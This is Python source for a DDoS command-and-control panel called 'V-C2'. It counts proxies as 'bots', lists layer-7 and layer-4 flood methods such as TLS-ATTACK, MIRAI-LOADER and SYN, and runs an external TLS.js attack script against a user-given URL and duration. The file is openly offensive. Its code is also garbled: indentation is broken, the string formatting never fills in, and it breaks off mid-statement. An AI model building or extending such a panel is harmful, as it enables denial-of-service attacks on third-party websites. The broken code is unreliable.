#<include>
import socket
import os
import requests
import random
import getpass
import time
import sys
import colorama
############
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')    
proxys = open('loader/proxy.txt').readlines()
bots = len(proxys)

def banner():
  clear()
  print('''
{red} _    __      _________ 
{red}| |  / /     / ____/__ \
{red}| | / /_____/ /    __/ /
{red}| |/ /_____/ /___ / __/ 
{red}|___/      \____//____/  {lim}@CIA_GOV
{blue}Welcome Back To V-C2 Panel
{lim}Online Bot {bots}
{lim}List Tools {tools}''')

def color(data_input_output):
    color_codes = {
        "GREEN": "\033[32m",
        "LIGHTGREEN_EX": "\033[92m",
        "YELLOW": "\033[33m",
        "LIGHTYELLOW_EX": "\033[93m",
        "CYAN": "\033[36m",
        "LIGHTCYAN_EX": "\033[96m",
        "BLUE": "\033[34m",
        "LIGHTBLUE_EX": "\033[94m",
        "MAGENTA": "\033[35m",
        "LIGHTMAGENTA_EX": "\033[95m",
        "RED": "\033[31m",
        "LIGHTRED_EX": "\033[91m",
        "BLSYN": "\033[30m",
        "LIGHTBLSYN_EX": "\033[90m",
        "WHITE": "\033[37m",
        "LIGHTWHITE_EX": "\033[97m",
    }

    return color_codes.get(data_input_output, "")

red = color("RED")
white = color("WHITE")
green = color("GREEN")
lim = color("LIGHTWHITE_EX")
blue = color("BLUE")

#tools
def help():
  print('''
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL''')

def layer7():
  print('''
  TLS-ATTACK
  MIRAI-LOADER
  HTTP-BYPASS
  HTTP-ZERO
  HTTP-ENGINE''')

def layer4():
  print('''
  UDP/TCP
  SYN
  OVH''')

def tools():
  print('''
  WHOIS
  NSLOOKUP
  IPLOOKUP''')

def rules():
  print('''
  ► Attacking .ps/.ru domains is prohibited 
  ► Selling and selling this tool is prohibited 
  ► It is allowed to copy this source code (for new development) 
  ► It is prohibited to turn off/alter this system''')

def main():
  banner()
  while(True):
    cnc = input("{red}root{lim}@{red}root#~ ")
    if cnc == "layer7" or cnc == "LAYER7" or cnc == "!L7" or cnc == "!l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "!L4" or cnc == "!l4":
            layer4()
        elif cnc == "rule" or cnc == "RULES" or cnc == "!rules" or cnc == "!RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "!CLS" or cnc == "!cls":
            main()
        elif cnc == "tools" or cnc == "!tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        
        elif "TLS-ATTACK" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node TLS.js {url} {time}')
            except IndexError:
                print('Usage: TLS <url> <time>')
                print('Example: TLS http://example.com 20')
         elif "HTTP-BYPASS"
             try:
                 url = cnc.split()[1]
                 
  



